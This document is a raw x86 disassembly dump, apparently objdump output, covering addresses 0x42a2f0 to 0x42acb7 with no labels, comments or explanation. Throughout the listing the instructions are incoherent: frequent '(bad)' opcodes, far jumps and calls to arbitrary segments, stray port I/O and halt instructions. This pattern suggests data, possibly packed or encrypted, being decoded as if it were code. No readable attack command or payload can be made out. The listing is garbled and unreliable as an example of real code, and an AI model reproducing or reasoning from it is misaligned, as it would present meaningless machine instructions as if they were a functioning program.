  42a2f0:	rcl    DWORD PTR [ebx],0xa1
  42a2f3:	jmp    0x21fb4dc5
  42a2f8:	mov    ebp,0xd09c2346
  42a2fd:	loope  0x42a321
  42a2ff:	inc    edi
  42a300:	jge    0x42a36d
  42a302:	mov    esp,0xe347945d
  42a307:	lock pop edi
  42a309:	fnsave [ebx]
  42a30b:	and    eax,0x354091da
  42a310:	fs aaa 
  42a312:	je     0x42a2e1
  42a314:	test   eax,0x62194920
  42a319:	pop    ebx
  42a31a:	xor    cl,BYTE PTR [edx+0x51]
  42a31d:	mov    esi,0x17ccc4a
  42a322:	xor    dh,bh
  42a324:	adc    BYTE PTR ds:0xb5e73972,dh
  42a32a:	xor    al,BYTE PTR [ebp-0x7d]
  42a32d:	iret   
  42a32e:	cmp    ecx,DWORD PTR [esi+0x7d]
  42a331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a332:	outs   dx,BYTE PTR ds:[esi]
  42a333:	jmp    0x6197:0xbd9714ab
  42a33a:	arpl   WORD PTR [ebp-0x23a9ef48],dx
  42a340:	pop    ebp
  42a341:	or     dl,dl
  42a343:	pop    edi
  42a344:	(bad)  
  42a345:	adc    eax,0x1aa2ff50
  42a34a:	repnz push cs
  42a34c:	mov    DWORD PTR [ebx-0x575bda4],esi
  42a352:	sub    eax,0xea2926dd
  42a357:	mov    edi,0xfc28f47d
  42a35c:	sbb    al,0x90
  42a35e:	jb     0x42a3b9
  42a360:	retf   0xe555
  42a363:	mov    esp,0xcdf0c32d
  42a368:	xchg   BYTE PTR [esi-0x40],dh
  42a36b:	mov    ebp,0xd151dea
  42a370:	mov    ds:0x5ef8ca6,eax
  42a375:	fldl2t 
  42a377:	aas    
  42a378:	sub    al,0x5c
  42a37a:	dec    edx
  42a37b:	mov    dh,0x4d
  42a37d:	add    BYTE PTR [ebx+eax*2],ah
  42a380:	cmp    BYTE PTR [edi+ebp*8-0x3d],bl
  42a384:	inc    esi
  42a385:	cmc    
  42a386:	jle    0x42a355
  42a388:	xchg   edi,eax
  42a389:	out    0x85,eax
  42a38b:	pop    es
  42a38c:	out    0x86,al
  42a38e:	jo     0x42a368
  42a390:	jp     0x42a376
  42a392:	fidivr WORD PTR [ebx]
  42a394:	dec    ebp
  42a395:	(bad)  
  42a396:	fwait
  42a397:	das    
  42a398:	push   ds
  42a399:	call   0xd1c4:0x84df9c58
  42a3a0:	mov    ecx,DWORD PTR [esp+eiz*2-0x4c]
  42a3a4:	mov    DWORD PTR [edi],esi
  42a3a6:	push   ds
  42a3a7:	das    
  42a3a8:	adc    esi,DWORD PTR [edi+0x31]
  42a3ab:	fcomp  DWORD PTR [edx-0x7fa3e60c]
  42a3b1:	cmp    al,0x5b
  42a3b3:	(bad)  
  42a3b4:	out    0xfa,eax
  42a3b6:	and    cl,BYTE PTR [esi]
  42a3b8:	ins    BYTE PTR es:[edi],dx
  42a3b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a3ba:	xor    DWORD PTR [eax-0x2],ebx
  42a3bd:	fs or  edx,ecx
  42a3c0:	jae    0x42a37c
  42a3c2:	sti    
  42a3c3:	not    BYTE PTR [ecx-0x52]
  42a3c6:	les    ebx,FWORD PTR ds:0x71f9a6ce
  42a3cc:	inc    edi
  42a3cd:	pop    ecx
  42a3ce:	scas   al,BYTE PTR es:[edi]
  42a3cf:	mov    ds:0xcf7eee04,eax
  42a3d4:	and    esi,DWORD PTR [esi-0x35]
  42a3d7:	dec    ebx
  42a3d8:	sub    al,0xce
  42a3da:	jb     0x42a36f
  42a3dc:	loop   0x42a395
  42a3de:	popf   
  42a3df:	jns    0x42a433
  42a3e1:	jno    0x42a3c8
  42a3e3:	in     al,dx
  42a3e4:	push   ds
  42a3e5:	sti    
  42a3e6:	dec    eax
  42a3e7:	jmp    0x42a3e2
  42a3e9:	dec    esi
  42a3ea:	sbb    BYTE PTR [edx],ah
  42a3ec:	aam    0xc1
	...
  42a456:	jg     0x42a466
  42a458:	jne    0x42a495
  42a45a:	jne    0x42a4d7
  42a45c:	jg     0x42a4ac
  42a45e:	loop   0x42a4c9
  42a460:	mov    ebp,0xc2c86e3d
  42a465:	call   0x4469d1
  42a46a:	add    BYTE PTR [ecx],al
  42a46c:	add    BYTE PTR [eax],al
  42a46e:	prefetcht2 BYTE PTR [edx+0x16]
  42a472:	bnd ret 
  42a474:	in     eax,dx
  42a475:	mov    eax,0xd21b9e8e
  42a47a:	hlt    
  42a47b:	add    al,0xe8
  42a47d:	push   ebp
  42a47e:	xor    eax,DWORD PTR [esi+0x1b76dfa4]
  42a484:	jbe    0x42a4a5
  42a486:	bound  esp,QWORD PTR [edi+0x11ff63e4]
  42a48c:	or     DWORD PTR [ebx-0x52],0xf940e3e
  42a493:	inc    BYTE PTR [ecx]
  42a495:	neg    BYTE PTR [edx+ebx*4+0x8]
  42a499:	leave  
  42a49a:	nop
  42a49b:	inc    eax
  42a49c:	mov    cl,0x82
  42a49e:	enter  0xd173,0xf1
  42a4a2:	sub    al,0x6b
  42a4a4:	aad    0x1
  42a4a6:	(bad)  
  42a4a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a4a8:	je     0x42a4c4
  42a4aa:	sbb    ebx,DWORD PTR [edi-0x22]
  42a4ad:	ds rcl BYTE PTR fs:[eax+0x4a12cb2a],1
  42a4b5:	mov    ecx,0x671d594b
  42a4ba:	mov    ebx,0xd861316
  42a4bf:	sub    al,0xdb
  42a4c1:	or     eax,0x3eb43371
  42a4c6:	bound  edi,QWORD PTR [ebx+0x48]
  42a4c9:	xchg   esi,eax
  42a4ca:	mov    esi,0xea1c0d65
  42a4cf:	daa    
  42a4d0:	mov    al,ds:0xa42b77ab
  42a4d5:	sbb    eax,0xba987782
  42a4da:	mov    ds:0x5cafef6d,eax
  42a4df:	cmp    al,0xc6
  42a4e1:	push   ebp
  42a4e2:	daa    
  42a4e3:	push   cs
  42a4e4:	dec    esp
  42a4e5:	dec    esi
  42a4e6:	push   0xf43ec6b9
  42a4eb:	add    eax,0xb57de128
  42a4f0:	ret    0x37e7
  42a4f3:	(bad)  
  42a4f5:	pusha  
  42a4f6:	xchg   BYTE PTR [esi+0x1b53ff93],dl
  42a4fc:	and    BYTE PTR [ecx+0x4a],dh
  42a4ff:	retf   
  42a500:	add    al,0xa5
  42a502:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a503:	(bad)  
  42a504:	test   al,0xad
  42a506:	xchg   esp,eax
  42a507:	cmp    bh,BYTE PTR [edx+0x4b]
  42a50a:	aam    0xa0
  42a50c:	shl    dh,cl
  42a50e:	test   BYTE PTR [eax+0xe2adda],bl
  42a514:	sub    cl,BYTE PTR [esi+0x73472745]
  42a51a:	(bad)  
  42a51b:	shl    DWORD PTR [edi-0x7b201a7f],1
  42a521:	(bad)  
  42a522:	mov    dh,0x30
  42a524:	dec    edi
  42a525:	cmp    BYTE PTR [eax+0x5323cd13],al
  42a52b:	pop    es
  42a52c:	cmp    BYTE PTR [edi],ah
  42a52e:	xchg   edi,eax
  42a52f:	mov    ds:0x370eec6a,al
  42a534:	and    DWORD PTR [esi+0x21],ebp
  42a537:	test   al,0x3
  42a539:	sbb    BYTE PTR [ecx+0x2e4b90a7],ah
  42a53f:	xor    eax,0xffd1ebec
  42a544:	ins    DWORD PTR es:[edi],dx
  42a545:	pusha  
  42a546:	pop    esi
  42a547:	push   0x16531580
  42a54c:	xchg   ebp,eax
  42a54d:	nop
  42a54e:	jmp    0x42a5b3
  42a550:	imul   eax,esi,0xb25503eb
  42a556:	popa   
  42a557:	dec    edi
  42a558:	in     eax,0x25
  42a55a:	inc    ebx
  42a55b:	aaa    
  42a55c:	rcl    ecx,cl
  42a55e:	pop    ebx
  42a55f:	ret    0xa2cd
  42a562:	and    ecx,DWORD PTR [edx+0x31]
  42a565:	ror    DWORD PTR [ebp+0x17],cl
  42a568:	mov    ebp,eax
  42a56a:	jae    0x42a578
  42a56c:	sar    BYTE PTR [esi],1
	...
  42a5d6:	sbb    BYTE PTR [edi+0x17],cl
  42a5d9:	mov    ecx,0xefbef957
  42a5de:	(bad)  
  42a5df:	cmc    
  42a5e0:	mov    edx,0x999a3f9f
  42a5e5:	imul   esp,DWORD PTR [edi-0x3a],0x1000001
  42a5ec:	add    BYTE PTR [eax],al
  42a5ee:	jmp    0x2b2650fa
  42a5f3:	mov    eax,0xb981eeac
  42a5f8:	lods   al,BYTE PTR ds:[esi]
  42a5f9:	cmc    
  42a5fa:	xchg   edi,eax
  42a5fb:	sar    dh,cl
  42a5fd:	xor    ebx,ebx
  42a5ff:	xchg   ebx,eax
  42a600:	nop
  42a601:	or     bl,BYTE PTR [esi]
  42a603:	jmp    0xf805:0xf3eaf812
  42a60a:	inc    edi
  42a60b:	push   ebp
  42a60c:	test   al,0xaf
  42a60e:	cmp    eax,0x8b114e7
  42a613:	mov    al,0x78
  42a615:	loopne 0x42a5ee
  42a617:	jge    0x42a667
  42a619:	sbb    cl,bh
  42a61b:	add    edx,DWORD PTR [edx-0x466b9387]
  42a621:	jp     0x42a694
  42a623:	loope  0x42a685
  42a625:	in     eax,dx
  42a626:	call   0xe16b:0xf92f11d4
  42a62d:	in     al,0xe5
  42a62f:	enter  0xf174,0xbb
  42a633:	sahf   
  42a634:	stc    
  42a635:	xchg   DWORD PTR [eax],ecx
  42a637:	push   cs
  42a638:	jnp    0x42a6b1
  42a63a:	inc    ecx
  42a63b:	jb     0x42a5e9
  42a63d:	jg     0x42a67c
  42a63f:	pop    ebx
  42a640:	mov    ebx,0x65cbf7f
  42a645:	inc    esp
  42a646:	int    0xe3
  42a648:	pop    eax
  42a649:	out    dx,eax
  42a64a:	push   esp
  42a64b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a64c:	mov    bh,0x42
  42a64e:	test   ah,ah
  42a650:	dec    edx
  42a651:	inc    edx
  42a652:	into   
  42a653:	pop    ds
  42a654:	sub    esp,DWORD PTR fs:[edi-0x5f]
  42a658:	cld    
  42a659:	sbb    dh,BYTE PTR [ecx]
  42a65b:	push   esp
  42a65c:	inc    edx
  42a65d:	xlat   BYTE PTR ds:[ebx]
  42a65e:	xchg   edi,eax
  42a65f:	je     0x42a633
  42a661:	xchg   ebx,eax
  42a662:	mov    ah,BYTE PTR [ecx]
  42a664:	inc    ecx
  42a665:	scas   al,BYTE PTR es:[edi]
  42a666:	adc    ch,ch
  42a668:	sub    ah,bl
  42a66a:	add    BYTE PTR [ebx],dl
  42a66c:	data16 out dx,al
  42a66e:	dec    edx
  42a66f:	cs aad 0x7
  42a672:	or     dh,dh
  42a674:	pop    ebp
  42a675:	fld    DWORD PTR [edi]
  42a677:	mov    ds:0x135641e9,al
  42a67c:	and    ecx,DWORD PTR [eax]
  42a67e:	mov    cl,0xf
  42a680:	sub    eax,0x8199d9aa
  42a685:	adc    BYTE PTR [edx],ah
  42a687:	cdq    
  42a688:	cmc    
  42a689:	hlt    
  42a68a:	jmp    0x337b6159
  42a68f:	sub    DWORD PTR [esi+0x4c8a0969],edi
  42a695:	mov    dh,0xec
  42a697:	enter  0xc010,0x6d
  42a69b:	not    esi
  42a69d:	add    BYTE PTR [eax+eax*4-0x296368fb],bl
  42a6a4:	das    
  42a6a5:	lea    eax,[edi]
  42a6a7:	add    BYTE PTR [eiz*1-0x6063eacc],dl
  42a6ae:	mov    esp,0xd3efb8eb
  42a6b3:	and    DWORD PTR [esi+0x30],0x53
  42a6b7:	fs pop esi
  42a6b9:	fdivr  st,st(4)
  42a6bb:	fdivr  QWORD PTR [ecx]
  42a6bd:	rcl    edi,cl
  42a6bf:	dec    edi
  42a6c0:	adc    al,0x7f
  42a6c2:	dec    edi
  42a6c3:	mov    edx,DWORD PTR [edx-0x33de5bf4]
  42a6c9:	jl     0x42a64f
  42a6cb:	(bad)  
  42a6cc:	fidiv  DWORD PTR [edi]
  42a6ce:	cwde   
  42a6cf:	stos   DWORD PTR es:[edi],eax
  42a6d0:	sar    BYTE PTR [edx],0x97
  42a6d3:	lods   eax,DWORD PTR ds:[esi]
  42a6d4:	inc    edx
  42a6d5:	mov    ch,0x12
  42a6d7:	mov    esp,0xf7e4a4d5
  42a6dc:	mov    WORD PTR [ebp-0x7f],es
  42a6df:	dec    ecx
  42a6e0:	and    edi,ebx
  42a6e2:	or     eax,esi
  42a6e4:	mov    WORD PTR [ebx+esi*8],ss
  42a6e7:	int3   
  42a6e8:	outs   dx,BYTE PTR ds:[esi]
  42a6e9:	cmp    al,0x2a
  42a6eb:	test   BYTE PTR [eax-0x6],0x0
	...
  42a753:	add    BYTE PTR [eax],al
  42a755:	add    BYTE PTR [esi+edx*1],ah
  42a758:	outs   dx,BYTE PTR ds:[esi]
  42a759:	(bad)  
  42a75a:	jle    0x42a75b
  42a75c:	lods   eax,DWORD PTR ds:[esi]
  42a75d:	test   DWORD PTR [edi-0x6747ece4],0x675fe45f
  42a767:	mov    DWORD PTR [ecx],0x10000
  42a76d:	add    BYTE PTR [ebp-0xe],al
  42a770:	jmp    0x42a772
  42a772:	push   ebx
  42a773:	xor    ecx,edx
  42a775:	jno    0x42a7e2
  42a777:	fadd   QWORD PTR ds:0xef1543af
  42a77d:	lahf   
  42a77e:	and    eax,0x36c22693
  42a783:	gs cmp al,0x5
  42a786:	mov    bl,0x41
  42a788:	mov    eax,edx
  42a78a:	inc    edx
  42a78b:	add    edx,esi
  42a78d:	dec    esi
  42a78e:	sbb    BYTE PTR [ebp-0x27495ade],0xe7
  42a795:	mov    ch,BYTE PTR [ebp-0x4d]
  42a798:	pop    eax
  42a799:	push   ecx
  42a79a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a79b:	test   DWORD PTR [edx+edx*2+0x3a4612b3],edi
  42a7a2:	das    
  42a7a3:	sbb    eax,DWORD PTR [ecx+0x69]
  42a7a6:	push   0xe35a94f8
  42a7ab:	fs jbe 0x42a756
  42a7ae:	int3   
  42a7af:	imul   edi,ebp,0x7a
  42a7b2:	sbb    eax,0x80e203f0
  42a7b7:	jecxz  0x42a7e7
  42a7b9:	push   esi
  42a7ba:	sub    eax,DWORD PTR [edx+0x2f]
  42a7bd:	push   esi
  42a7be:	mov    ah,0xb7
  42a7c0:	and    al,0xbb
  42a7c2:	add    esi,DWORD PTR [esi]
  42a7c4:	repnz cdq 
  42a7c6:	jb     0x42a7b5
  42a7c8:	ds nop
  42a7ca:	fnstcw WORD PTR [edi+0x5c04e31]
  42a7d0:	(bad)  
  42a7d1:	pop    esp
  42a7d2:	(bad)  
  42a7d3:	repz mov fs,WORD PTR ds:0x59f09ba1
  42a7da:	push   ecx
  42a7db:	jae    0x42a83a
  42a7dd:	cmp    ah,BYTE PTR [edx]
  42a7df:	xchg   edx,eax
  42a7e0:	aad    0x2f
  42a7e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a7e3:	ror    BYTE PTR [ebx-0x10],cl
  42a7e6:	stos   BYTE PTR es:[edi],al
  42a7e7:	push   esi
  42a7e8:	jns    0x42a825
  42a7ea:	sbb    ch,BYTE PTR [edi]
  42a7ec:	sub    dh,BYTE PTR [esi-0xfb3c988]
  42a7f2:	sti    
  42a7f3:	pop    DWORD PTR [ecx]
  42a7f5:	mov    ds:0xd096adf4,al
  42a7fa:	shl    esp,cl
  42a7fc:	xor    edi,DWORD PTR [ebx]
  42a7fe:	pop    ebp
  42a7ff:	jmp    0x2891:0xaac1003b
  42a806:	dec    edi
  42a807:	pop    edi
  42a808:	cmp    eax,0x2547e626
  42a80d:	cld    
  42a80e:	mov    dh,0xc2
  42a810:	(bad)  [ebp-0x11f3427d]
  42a816:	fnsave [ecx-0x167159e1]
  42a81c:	dec    edx
  42a81d:	mov    ah,0xd4
  42a81f:	xchg   ecx,eax
  42a820:	rcl    DWORD PTR [ebx+esi*1],0x7c
  42a824:	sti    
  42a825:	pushf  
  42a826:	hlt    
  42a827:	xchg   esp,eax
  42a828:	add    esi,DWORD PTR [edi]
  42a82a:	push   0xffffffc7
  42a82c:	(bad)  
  42a82d:	bound  esi,QWORD PTR ds:0x29c7dfc1
  42a833:	cli    
  42a834:	loopne 0x42a7f2
  42a836:	iret   
  42a837:	shr    DWORD PTR [esi+0x6c],1
  42a83a:	outs   dx,DWORD PTR ds:[esi]
  42a83b:	loope  0x42a8a2
  42a83d:	popa   
  42a83e:	mov    ebp,0x6810fec
  42a843:	stc    
  42a844:	shl    BYTE PTR [esi],cl
  42a846:	imul   esp,DWORD PTR [ebx+0x2a],0x305aa524
  42a84d:	mov    cl,dh
  42a84f:	rol    DWORD PTR [edi+0x22],0x6f
  42a853:	mov    dh,0x94
  42a855:	xchg   esp,eax
  42a856:	adc    DWORD PTR [eax-0x80],edx
  42a859:	sar    cl,cl
  42a85b:	fdivr  QWORD PTR [ecx+edx*4+0x42]
  42a85f:	leave  
  42a860:	xor    DWORD PTR [eax],esp
  42a862:	xor    eax,0x3e1a1b7f
  42a867:	test   DWORD PTR [edx*1+0x3acb8c55],eax
	...
  42a8d6:	mov    ah,BYTE PTR [ebp+0x63]
  42a8d9:	mov    edi,0x75debfef
  42a8de:	add    ebp,0x48c86c97
  42a8e4:	out    dx,eax
  42a8e5:	and    BYTE PTR [edi-0x38],ah
  42a8e8:	add    DWORD PTR [eax],eax
  42a8ea:	add    BYTE PTR [ecx],al
  42a8ec:	add    BYTE PTR [eax],al
  42a8ee:	retf   
  42a8ef:	ins    BYTE PTR es:[edi],dx
  42a8f0:	int3   
  42a8f1:	int    0xb1
  42a8f3:	sub    al,0x1f
  42a8f5:	clc    
  42a8f6:	fucomi st,st(5)
  42a8f8:	pop    ebx
  42a8f9:	pop    ebp
  42a8fa:	fs in  al,dx
  42a8fc:	mov    ebp,0xd9932b0a
  42a901:	or     eax,0x5a52333c
  42a906:	in     al,0x64
  42a908:	xor    cl,BYTE PTR ds:0x6e3fae94
  42a90e:	call   0x71c:0x3e996963
  42a915:	ret    
  42a916:	cli    
  42a917:	push   eax
  42a918:	outs   dx,DWORD PTR ds:[esi]
  42a919:	shl    eax,cl
  42a91b:	pop    ebx
  42a91c:	fs (bad) 
  42a91e:	in     eax,dx
  42a91f:	lds    eax,FWORD PTR [ebp+eiz*4+0xeb22c]
  42a926:	xor    eax,0x75e6ab22
  42a92b:	lahf   
  42a92c:	push   ds
  42a92d:	cmp    al,0x43
  42a92f:	pop    ebx
  42a930:	imul   edi,DWORD PTR [eax-0x70],0xffffffd9
  42a934:	cmp    DWORD PTR [ecx+0x2f504410],ebp
  42a93a:	add    ebp,0x71
  42a93d:	mov    BYTE PTR [ebx+0x447e4479],bl
  42a943:	rcl    BYTE PTR [edx+0x5a9d4c3e],1
  42a949:	adc    ebp,DWORD PTR [esi+0x1bf1c4a5]
  42a94f:	jae    0x42a8d1
  42a951:	inc    esi
  42a952:	cmp    al,0xc3
  42a954:	sbb    bl,ah
  42a956:	lea    ebx,[ebx-0x68]
  42a959:	fdiv   QWORD PTR [eax+eax*4]
  42a95c:	jl     0x42a990
  42a95e:	or     DWORD PTR [esi],ebx
  42a960:	push   ebx
  42a961:	fs push edx
  42a963:	push   ecx
  42a964:	(bad)  
  42a965:	xor    DWORD PTR [esi+0x57],edi
  42a968:	ins    DWORD PTR es:[edi],dx
  42a969:	jge    0x42a995
  42a96b:	clc    
  42a96c:	ins    DWORD PTR es:[edi],dx
  42a96d:	addr16 test al,0xc2
  42a970:	(bad)  
  42a971:	outs   dx,DWORD PTR ds:[esi]
  42a972:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a973:	sub    DWORD PTR [eax],ecx
  42a975:	mov    ah,0x64
  42a977:	or     ecx,DWORD PTR [ebp+0x14]
  42a97a:	lds    ebx,FWORD PTR [edi+0x7b22e0ff]
  42a980:	jp     0x42a9ce
  42a982:	ror    BYTE PTR [edx-0x675d53a3],1
  42a988:	mov    ebp,0xd928b8c3
  42a98d:	pushf  
  42a98e:	push   ds
  42a98f:	lods   eax,DWORD PTR ds:[esi]
  42a990:	fisttp WORD PTR [esi+0x6772e4ad]
  42a996:	xchg   BYTE PTR [esi+ebx*4+0x6f],al
  42a99a:	cmp    edx,DWORD PTR ds:0x814b9ab9
  42a9a0:	mov    eax,ds:0x3c2d18da
  42a9a5:	or     BYTE PTR [edi-0x2d],0x5c
  42a9a9:	adc    esi,DWORD PTR [esp+edi*4-0x602f8ca0]
  42a9b0:	cdq    
  42a9b1:	push   ss
  42a9b2:	pusha  
  42a9b3:	(bad)  
  42a9b4:	or     al,0x6c
  42a9b6:	xlat   BYTE PTR ds:[ebx]
  42a9b7:	mov    bl,0x5a
  42a9b9:	mov    eax,ds:0x5a9704f4
  42a9be:	mov    WORD PTR [ebx],es
  42a9c0:	je     0x42a98d
  42a9c2:	jge    0x42aa27
  42a9c4:	pop    eax
  42a9c5:	pop    ds
  42a9c6:	push   eax
  42a9c7:	xor    eax,0x4058b84a
  42a9cc:	data16 hlt 
  42a9ce:	outs   dx,BYTE PTR ds:[esi]
  42a9cf:	sbb    eax,0x3a2bdb59
  42a9d4:	imul   edi,DWORD PTR [esi+ecx*8],0x53
  42a9d8:	popf   
  42a9d9:	sbb    BYTE PTR [edi+0x8aed0c7],ah
  42a9df:	jb     0x42aa1a
  42a9e1:	ret    0xec40
  42a9e4:	add    cl,BYTE PTR [ecx+0x33]
  42a9e7:	jnp    0x42aa5a
  42a9e9:	inc    eax
  42a9ea:	test   al,0xb1
  42a9ec:	fmul   QWORD PTR [esi+0x0]
	...
  42aa53:	add    BYTE PTR [eax],al
  42aa55:	add    BYTE PTR [eax+0x3fee1d93],ch
  42aa5b:	out    dx,al
  42aa5c:	sti    
  42aa5d:	xlat   BYTE PTR ds:[ebx]
  42aa5e:	in     eax,0xd3
  42aa60:	aad    0x7
  42aa62:	mov    ch,0xb1
  42aa64:	jb     0x42aa5e
  42aa66:	addr16 leave 
  42aa68:	add    DWORD PTR [eax],eax
  42aa6a:	add    BYTE PTR [ecx],al
  42aa6c:	add    BYTE PTR [eax],al
  42aa6e:	jp     0x42aac1
  42aa70:	push   es
  42aa71:	aam    0x9e
  42aa73:	sbb    dh,BYTE PTR [edi-0x15]
  42aa76:	cmp    DWORD PTR ds:0x6d769b76,0x8c4ad47b
  42aa80:	sar    DWORD PTR [esi+0x0],cl
  42aa83:	das    
  42aa84:	lods   al,BYTE PTR ds:[esi]
  42aa85:	mov    ah,0x96
  42aa87:	(bad)  
  42aa88:	aam    0xfb
  42aa8a:	shr    BYTE PTR [esi],0x49
  42aa8d:	push   0x300cf6e0
  42aa92:	mov    dl,0x99
  42aa94:	jle    0x42aa90
  42aa96:	fcomp  QWORD PTR [edi-0x1b]
  42aa99:	pusha  
  42aa9a:	into   
  42aa9b:	jg     0x42ab17
  42aa9d:	test   DWORD PTR [ebx],eax
  42aa9f:	(bad)  
  42aaa1:	push   ds
  42aaa2:	cli    
  42aaa3:	xor    DWORD PTR [eax],ebp
  42aaa5:	and    BYTE PTR [edx-0x55],ah
  42aaa8:	lods   eax,DWORD PTR ds:[esi]
  42aaa9:	inc    edx
  42aaaa:	dec    esi
  42aaab:	shl    DWORD PTR [eax],1
  42aaad:	ftst   
  42aaaf:	jno    0x42ab1e
  42aab1:	ds cld 
  42aab3:	jae    0x42aaba
  42aab5:	lods   eax,DWORD PTR ds:[esi]
  42aab6:	lea    eax,[edx+0x2b178a7b]
  42aabc:	aad    0xc7
  42aabe:	ss gs scas al,BYTE PTR es:[edi]
  42aac1:	mov    edi,esp
  42aac3:	sub    al,0xbb
  42aac5:	pusha  
  42aac6:	lahf   
  42aac7:	push   edi
  42aac8:	popf   
  42aac9:	pusha  
  42aaca:	je     0x42aaad
  42aacc:	jo     0x42ab30
  42aace:	add    ebp,DWORD PTR [esi]
  42aad0:	ret    
  42aad1:	dec    edi
  42aad2:	sub    DWORD PTR ds:0x843184a0,ecx
  42aad8:	hlt    
  42aad9:	xor    ch,BYTE PTR [edx+0x2a]
  42aadc:	das    
  42aadd:	retf   
  42aade:	iret   
  42aadf:	or     ebx,DWORD PTR [ecx]
  42aae1:	and    al,0x3d
  42aae3:	data16 stos BYTE PTR es:[edi],al
  42aae5:	cwde   
  42aae6:	mov    edx,0x772d8f38
  42aaeb:	fidivr DWORD PTR [ebx+0x50004f14]
  42aaf1:	sbb    al,0xa
  42aaf3:	shr    DWORD PTR [ecx-0x6756781e],0xf1
  42aafa:	test   DWORD PTR [edx+edx*4+0x2e],0xa88ac890
  42ab02:	mov    ebx,0xb701aa93
  42ab07:	cdq    
  42ab08:	cmp    DWORD PTR [ebx],ebx
  42ab0a:	dec    ebp
  42ab0b:	arpl   WORD PTR [ecx+0x72],ax
  42ab0e:	push   esp
  42ab0f:	outs   dx,DWORD PTR ds:[esi]
  42ab10:	push   ds
  42ab11:	xchg   DWORD PTR [edx-0x30],esp
  42ab14:	cmp    cl,ah
  42ab16:	out    0x72,eax
  42ab18:	xor    eax,0x4f8ffad2
  42ab1d:	fcmovnb st,st(4)
  42ab1f:	sti    
  42ab20:	add    ebx,DWORD PTR [ebx+0x497ffe4]
  42ab26:	inc    ecx
  42ab27:	or     al,0x72
  42ab29:	pop    es
  42ab2a:	jl     0x42aabe
  42ab2c:	mov    edx,?
  42ab2e:	push   eax
  42ab2f:	pop    ds
  42ab30:	mov    esi,0x494e4e76
  42ab35:	test   DWORD PTR [eax],ecx
  42ab37:	mov    al,0xe8
  42ab39:	adc    eax,0x20fbe04d
  42ab3e:	sub    BYTE PTR [edi-0x4f1a17c],0x17
  42ab45:	ss jecxz 0x42ab52
  42ab48:	bound  ebx,QWORD PTR [esi+0x2c]
  42ab4b:	std    
  42ab4c:	ret    0x6cec
  42ab4f:	shr    DWORD PTR [ecx+eax*4],1
  42ab52:	outs   dx,BYTE PTR ds:[esi]
  42ab53:	pop    ebx
  42ab54:	imul   ebx,DWORD PTR [esi+eax*4-0x89311d7],0x5339fb0a
  42ab5f:	mov    cl,0xc0
  42ab61:	cmp    DWORD PTR [eax-0x78],ebp
  42ab64:	or     ecx,DWORD PTR [ebx+0x66bb667b]
  42ab6a:	int3   
  42ab6b:	mov    bh,0xe5
  42ab6d:	pop    eax
	...
  42abd6:	ds push cs
  42abd8:	sub    al,0x5d
  42abda:	cmp    al,0x7f
  42abdc:	jg     0x42ac4d
  42abde:	and    BYTE PTR [eax],cl
  42abe0:	mov    dl,0x43
  42abe2:	loope  0x42ac22
  42abe4:	pop    ecx
  42abe5:	mov    edi,0x1ca67
  42abea:	add    BYTE PTR [ecx],al
  42abec:	add    BYTE PTR [eax],al
  42abee:	mov    ch,0xf
  42abf0:	xlat   BYTE PTR ds:[ebx]
  42abf1:	push   ebp
  42abf2:	dec    esi
  42abf3:	sti    
  42abf4:	std    
  42abf5:	inc    esi
  42abf6:	fld    QWORD PTR [ebx+ebx*2-0x27]
  42abfa:	sbb    esi,DWORD PTR [esi+0x11ad073c]
  42ac00:	dec    ebp
  42ac01:	fwait
  42ac02:	sbb    eax,0x6da955da
  42ac07:	and    bl,bh
  42ac09:	(bad)  
  42ac0a:	les    ecx,FWORD PTR [ebp+0x43]
  42ac0d:	pushf  
  42ac0e:	jl     0x42ac77
  42ac10:	dec    esi
  42ac11:	and    al,0x70
  42ac13:	jnp    0x42ac22
  42ac15:	dec    edx
  42ac16:	aad    0xc2
  42ac18:	sar    bh,0xd
  42ac1b:	rol    DWORD PTR [ebx],0x5b
  42ac1e:	mov    dl,0xba
  42ac20:	repz repz push ss
  42ac23:	popf   
  42ac24:	xor    eax,0xacdef00a
  42ac29:	les    eax,FWORD PTR [ecx+0x54]
  42ac2c:	aam    0xea
  42ac2e:	xchg   DWORD PTR [esi-0x7ae88364],ebp
  42ac34:	pop    edx
  42ac35:	and    BYTE PTR [ecx+ebx*4],0xf
  42ac39:	hlt    
  42ac3a:	mov    al,0xc3
  42ac3c:	mov    ebx,DWORD PTR [ecx-0x7e]
  42ac3f:	hlt    
  42ac40:	mov    ch,0x60
  42ac42:	or     eax,0x51dd5397
  42ac47:	inc    ebp
  42ac48:	bnd jg 0x42ac48
  42ac4b:	test   DWORD PTR [eax],eax
  42ac4d:	hlt    
  42ac4e:	or     ch,bh
  42ac50:	bound  ecx,QWORD PTR [edx]
  42ac52:	jge    0x42ac3b
  42ac54:	sbb    al,0xd9
  42ac56:	pop    edx
  42ac57:	das    
  42ac58:	and    ch,dh
  42ac5a:	sbb    ebx,edx
  42ac5c:	mov    esi,0xf86be3c9
  42ac61:	dec    ebp
  42ac62:	add    al,0x26
  42ac64:	es mov esp,gs
  42ac67:	scas   eax,DWORD PTR es:[edi]
  42ac68:	fdiv   QWORD PTR [ecx]
  42ac6a:	adc    BYTE PTR [edi-0xc9bdbb2],cl
  42ac70:	ret    
  42ac71:	adc    BYTE PTR [ecx+0x45d1f4a1],cl
  42ac77:	jmp    0x5a51:0x8b80d1bb
  42ac7e:	inc    ecx
  42ac7f:	fldcw  WORD PTR [eax+0x7c6cf29b]
  42ac85:	cmp    eax,0x21d811d7
  42ac8a:	mov    esi,0x42e4b01b
  42ac8f:	push   eax
  42ac90:	mov    ds:0x109a720d,al
  42ac95:	mov    edx,0x5fe8bebe
  42ac9a:	pop    es
  42ac9b:	mov    edi,0x198a022d
  42aca0:	push   edi
  42aca1:	iret   
  42aca2:	aam    0xd7
  42aca4:	add    edi,DWORD PTR [esi-0x80]
  42aca7:	push   ds
  42aca8:	ins    BYTE PTR es:[edi],dx
  42aca9:	imul   esi,DWORD PTR [eax],0xe
  42acac:	test   DWORD PTR [edx],ecx
  42acae:	mov    ecx,0xa9464580
  42acb3:	(bad)  
  42acb5:	out    0xdc,al
  42acb7:	ja     0x42ac56
